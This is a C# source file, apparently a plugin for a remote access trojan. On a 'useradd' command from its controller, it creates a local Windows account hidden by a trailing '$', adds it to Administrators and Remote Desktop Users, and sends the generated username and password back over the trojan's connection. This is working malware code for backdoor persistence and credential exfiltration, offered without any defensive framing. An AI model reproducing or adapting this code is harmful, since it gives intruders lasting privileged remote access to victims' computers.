using MessagePackLib.MessagePack;
using System;
using System.DirectoryServices;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "useradd":
                        {
                            UserAdd(unpack_msgpack.ForcePathObject("Username").AsString);
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
            Connection.Disconnected();
        }
        public static void UserAdd(string user)
        {
            string username = user + "$";
            //10位随机密码
            string chars = "!@#$%0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            Random randrom = new Random((int)DateTime.Now.Ticks);
            string password = "";
            for (int i = 0; i < 10; i++)
            {
                password += chars[randrom.Next(chars.Length)];
            }
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(username, "user");
                NewUser.Invoke("SetPassword", new object[] { password });
                //NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                grp = AD.Children.Find("Remote Desktop Users", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                Log(Connection.Hwid + ":[+] Account Created Successfully");
                Log(Connection.Hwid + String.Format(":[+] Username: {0} ", username));
                Log(Connection.Hwid + String.Format(":[+] Password: {0} ", password));
                //Console.WriteLine("[*] Account Created Successfully");
                //Console.WriteLine($"[+] Username: {username}\n[+] Password: {password}");
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}